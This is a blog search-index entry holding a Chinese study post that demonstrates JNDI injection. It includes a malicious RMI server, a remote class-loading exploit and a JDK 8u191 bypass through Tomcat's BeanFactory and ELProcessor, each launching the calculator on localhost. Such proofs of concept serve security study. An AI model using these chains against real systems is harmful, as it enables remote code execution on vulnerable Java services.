<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>简单的JNDI远程调用利用的Demo</title>
    <link href="/posts/2855726463.html"/>
    <url>/posts/2855726463.html</url>
    
    <content type="html"><![CDATA[<h2 id="简单的JNDI远程调用利用的Demo"><a href="#简单的JNDI远程调用利用的Demo" class="headerlink" title="简单的JNDI远程调用利用的Demo"></a>简单的JNDI远程调用利用的Demo</h2><hr><h4 id="Server-java"><a href="#Server-java" class="headerlink" title="Server.java"></a>Server.java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> JNDI.server;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        String uri=<span class="hljs-string">&quot;http://127.0.0.1:8000/&quot;</span>;<br>        System.out.println(<span class="hljs-string">&quot;[*]ClassFactoryLocation: &quot;</span>+uri);<br>        Registry registry= LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        Reference reference=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;abcdef&quot;</span>,<span class="hljs-string">&quot;exploit&quot;</span>,uri);<br>        ReferenceWrapper referenceWrapper=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        System.out.println(<span class="hljs-string">&quot;[*]Binding &#x27;demo&#x27; to rmi://127.0.0.1:1099&quot;</span>);<br>        registry.bind(<span class="hljs-string">&quot;demo&quot;</span>,referenceWrapper);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Client-java"><a href="#Client-java" class="headerlink" title="Client.java"></a>Client.java</h4><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> JNDI.client;<br><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Client</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) throws Exception&#123;<br>    <span class="hljs-comment">// 一定要加上下面那两行，不然可能会出现各种问题，比如说无法请求http，导致复现失败</span><br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>,<span class="hljs-string">&quot;true&quot;</span>);<br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);<br>        <span class="hljs-keyword">String</span> uri=<span class="hljs-string">&quot;rmi://127.0.0.1:1099/demo&quot;</span>;<br>        InitialContext ctx=<span class="hljs-keyword">new</span> <span class="hljs-type">InitialContext</span>();<br>        ctx.lookup(uri);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="exploit-java"><a href="#exploit-java" class="headerlink" title="exploit.java"></a>exploit.java</h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs abnf">public class exploit &#123;<br>    static &#123;<br>        try&#123;<br>            Runtime rt<span class="hljs-operator">=</span>Runtime.getRuntime()<span class="hljs-comment">;</span><br>            String[] commands<span class="hljs-operator">=</span>&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;<span class="hljs-comment">;</span><br>            Process pc<span class="hljs-operator">=</span>rt.exec(commands)<span class="hljs-comment">;</span><br>            pc.waitFor()<span class="hljs-comment">;</span><br>        &#125;catch (Exception e)&#123;<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h4><p>1、运行Server.java</p><p>2、编译exploit.java并开启http服务</p><p><img src="/.%5Cassets%5Cimage-20230128203446917.png" alt="image-20230128203446917"></p><p>3、运行Client.java</p><p><img src="/.%5Cassets%5Cimage-20230128203550652.png" alt="image-20230128203550652"></p><h2 id="Java8u191-JNDI绕过Demo"><a href="#Java8u191-JNDI绕过Demo" class="headerlink" title="Java8u191 JNDI绕过Demo"></a>Java8u191 JNDI绕过Demo</h2><hr><h4 id="maven依赖"><a href="#maven依赖" class="headerlink" title="maven依赖"></a>maven依赖</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.el<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>com.springsource.org.apache.el<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>7.0.26<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="Server-java-1"><a href="#Server-java-1" class="headerlink" title="Server.java"></a>Server.java</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">package JNDI.<span class="hljs-keyword">server</span>;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> <span class="hljs-keyword">Server</span> &#123;<br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws <span class="hljs-keyword">Exception</span>&#123;<br>        Registry registry= LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        ResourceRef <span class="hljs-keyword">ref</span> = <span class="hljs-built_in">new</span> ResourceRef(&quot;javax.el.ELProcessor&quot;, <span class="hljs-keyword">null</span>, &quot;&quot;, &quot;&quot;, <span class="hljs-keyword">true</span>, &quot;org.apache.naming.factory.BeanFactory&quot;, <span class="hljs-keyword">null</span>);<br>        <span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-built_in">new</span> StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));<br>        <span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-built_in">new</span> StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;<span class="hljs-built_in">new</span> java.lang.ProcessBuilder[<span class="hljs-string">&#x27;(java.lang.String[])&#x27;</span>]([<span class="hljs-string">&#x27;cmd&#x27;</span>,<span class="hljs-string">&#x27;/c&#x27;</span>,<span class="hljs-string">&#x27;calc&#x27;</span>]).<span class="hljs-keyword">start</span>()\&quot;)&quot;));<br>        ReferenceWrapper referenceWrapper=<span class="hljs-built_in">new</span> ReferenceWrapper(<span class="hljs-keyword">ref</span>);<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;[*]Binding &#x27;demo&#x27; to rmi://127.0.0.1:1099&quot;);<br>        registry.bind(&quot;demo&quot;,referenceWrapper);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Client-java-1"><a href="#Client-java-1" class="headerlink" title="Client.java"></a>Client.java</h4><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> JNDI.client;<br><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Client</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) throws Exception&#123;<br>        <span class="hljs-keyword">String</span> uri=<span class="hljs-string">&quot;rmi://127.0.0.1:1099/demo&quot;</span>;<br>        InitialContext ctx=<span class="hljs-keyword">new</span> <span class="hljs-type">InitialContext</span>();<br>        ctx.lookup(uri);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="复现过程-1"><a href="#复现过程-1" class="headerlink" title="复现过程"></a>复现过程</h4><p>1、运行Server.java</p><p>2、运行Client.java</p><p><img src="/assets/image-20230129115331462.png" alt="image-20230129115331462"></p><p>参考：</p><p><a href="https://y4er.com/posts/use-local-factory-bypass-jdk-to-jndi/#jndi%E6%B3%A8%E5%85%A5">利用本地Factory绕过jdk高版本限制进行jndi注入</a></p><p><a href="https://blog.51cto.com/u_15847702/5808337">JDK8u191之后的JNDI注入绕过(javax.el.ELProcessor依赖)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
